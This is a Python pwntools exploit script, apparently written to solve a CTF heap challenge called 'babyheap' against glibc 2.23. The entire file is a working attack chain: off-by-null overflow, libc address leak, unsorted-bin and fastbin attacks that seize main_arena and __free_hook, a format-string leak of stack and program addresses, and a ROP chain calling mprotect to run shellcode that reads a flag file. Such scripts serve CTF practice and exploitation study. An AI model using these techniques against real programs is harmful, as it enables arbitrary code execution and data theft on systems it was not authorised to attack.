# File: exp.py
# Author: raycp
# Date: 2019-05-20
# Description: exp for babyheap

from pwn import *
from pwn_debug.pwn_debug import *
from pwn_debug.IO_FILE_plus import *
pdbg=pwn_debug("babyheap")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local("./libc-2.23.so")
pdbg.debug("2.23")
pdbg.remote('123.206.174.203', 20001,"./libc-2.23.so")
p=pdbg.run("local")
#p=pdbg.run("remote")
#p=pdbg.run("debug")

#membp=pdbg.membp
#print type(pdbg.membp)
#print pdbg.hh
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc
#a=IO_FILE_plus()
#print a
#a.show()
#print a._IO_read_base

def add(size):
    p.recvuntil("Choice: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))

def edit(idx,data):
    p.recvuntil("Choice: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Content: ")
    p.send(data)


def delete(idx):
    p.recvuntil("Choice: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))


def show(idx):
    p.recvuntil("Choice: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))


def pwn():
    add(0x60)#0
    add(0x68)#1
    add(0x1e0)#2
    add(0x80)#3
    add(0x80)#4
    add(0x300) #5
    add(0x80)#6
    edit(2,(p64(0x100)+p64(0))*0x1d)
    add(0x50) #7
    add(0x1e0) #8
    add(0x60) #9
    add(0x80) #10
    #pdbg.bp(0x11e7)
    
    delete(2)
    ## step 1 off-by-null vuln here
    edit(1,'a'*0x60+p64(0x60))
    add(0x40)#2
    
    add(0x60)#11 this is the overlap chunk.

    #pdbg.bp([0x10fe])
    add(0x20) #12
    #delete(5)
    delete(2)
    delete(3) ## here form the overlap chunk.

    add(0x40) #2
    show(11)
    ## step 2 leak libc address
    unsorted_addr=u64(p.recvuntil('\x7f').ljust(8,'\x00'))
    #libc_base=unsorted_addr-libc.symbols['main_arena']-88
    libc_base=unsorted_addr-0x3c4b20-88
    io_list_all=libc_base+libc.symbols['_IO_list_all']
    log.info("leak libc base: %s"%hex(libc_base))

    #global_max_fast=libc_base+libc.symbols['global_max_fast']
    global_max_fast=libc_base+ 0x3c67f8

    binsh_addr=libc_base+next(libc.search("/bin/sh"))
    system_addr=libc_base+libc.symbols['system']
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    printf_addr=libc_base+libc.symbols['printf']
    #main_arena=libc_base+libc.symbols['main_arena']
    main_arena=libc_base+0x3c4b20

    free_hook=libc_base+libc.symbols['__free_hook']
    rce=libc_base+0x3f3e6 
    #pdbg.bp([0x11e7,0x12bd,0x10fe])
    add(0x60) #3
    #edit(12,p64(unsorted_addr)+p64(io_list_all-0x10))
    ## step 3 unsorted bin attack to overwrite global_max_fast
    edit(12,p64(unsorted_addr)+p64(global_max_fast-0x10))
    add(0x1b0)

    ## step 4 fastbin attack to malloc out __malloc_hook(main_arena)
    delete(11)
    delete(9)
    delete(3)
    fd_ptr = malloc_hook - 0x1b - 8

    add(0x60) #3
    #pdbg.bp([0x11e7,0x12bd,0x10fe])

    edit(3,p64(fd_ptr))
    add(0x60) #9
    add(0x60) #11
    #pdbg.bp(0x10c9)
    add(0x60) #0xe
    #edit(0xe,'a'*19+(p64(0)+p64(0x71))*4)
    
    ## step 5 overwrite main_arena with p64(0)+p64(0x71) to form fake chunk size
    edit(0xe,'a'*19+(p64(0)+p64(0x71))*4)

    ## step 6 clean the ptr array 
    delete(0)
    delete(1)
    delete(2)
    delete(4)
    delete(5)
    delete(6)
    delete(7)
    delete(8)
    #pdbg.bp([0x10fe,0x12bd])

    ## step 7 uaf to malloc out main_arena
    delete(3)
    delete(9)
    delete(11)
    add(0x60)
    edit(0,p64(main_arena)) #0
    add(0x60)  #1
    add(0x60) #2
    add(0x68) #3
    #pdbg.bp([0x11e7,0x10fe,0x12bd])


    ## step 8 overwrite top chunk to main_arena and repair unsorted bins
    edit(3,p64(0)*9+p64(main_arena+0x1d8)+p64(0)+p64(unsorted_addr)*2)
    fastbin_ptr=main_arena+8
    null_addr=main_arena+0x40
    idx=(null_addr-fastbin_ptr)/8
    size=idx*0x10+0x20

    
    ## step 9 null set main arena to malloc big chunk
    add(size) #4
    
    ## step 10 overwrite top chunk to free_hook
    edit(3,p64(0)*9+p64(free_hook-0xb58)+p64(0)+p64(unsorted_addr)*2)
    null_addr=main_arena+0x1e8
    idx=(null_addr-fastbin_ptr)/8
    size=idx*0x10+0x20

    #step 11 malloc chunk which make top chunk point to free_hook
    add(size) #5
    add(size) #6
    add(size) #7
    
    #pdbg.bp([0x11e7,0x10fe,0x12bd,0x10c9])
    ## step 12 overwrite free_hook to printf address
    payload='\x00'*0x368+p64(printf_addr)
    edit(7,payload)

    ## step 13 format vuln to leak program address and stack address
    edit(6,"**%18$p***%19$p**")
    #pdbg.bp([0x11e7,0x10fe,0x12bd,0x10c9])
    delete(6)
    p.recvuntil("**")
    addr=int(p.recvuntil("***")[:-3],16)
    pro_base=int(p.recvuntil("**")[:-2],16)-0xc84
    log.info("stack addr: %s"%hex(addr))
    log.info("pro base: %s"%hex(pro_base))


    #fopen_addr=pro_base+0x1426
    ## step 14 overwrite free_hook to read address
    ret_addr=libc_base+0x000000000008e73e #add rsp, 0x100 ; ret
    payload='\x00'*0x368+p64(ret_addr)
    #pdbg.bp([0x12bd,0x11e7])
    edit(7,payload)

    ## step 15 overwrite top chunk to stack return address
    edit(3,p64(0)*9+p64(addr-0x10)+p64(0)+p64(unsorted_addr)*2)
    add(0x140) #
    
    ## step 16 build rop chain and shellcode
    prdi_ret=pro_base+0x0000000000001433 #: pop rdi ; ret
    prsi_p_ret=pro_base+0x0000000000001431 #: pop rsi ; pop r15 ; ret
    prdx_ret=libc_base+0x0000000000001b92#: pop rdx ; ret

    mprotect_addr=libc_base+libc.symbols['mprotect']
    #pdbg.bp(0x1433)
     
    shellcode=asm(shellcraft.amd64.open("flag",0))+asm(shellcraft.amd64.read(3,addr+0x100,0x50))+asm(shellcraft.amd64.write(1,addr+0x100,0x50))
    payload=shellcode.ljust(0x18+0x60,'a')+p64(prsi_p_ret)+p64(0x1000)+p64(0)+p64(prdx_ret)+p64(7)+p64(prdi_ret)+p64(addr&0xfffffffffffff000)+p64(mprotect_addr)+p64(addr)*2
    #pdbg.bp(0x1230)
    ## step 17 malloc out stack address and depoy shellcode and rop chain
    edit(6,payload)

    ## step 18 trigger free to execute rop chain and shellcode to read flag
    delete(2)


    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()


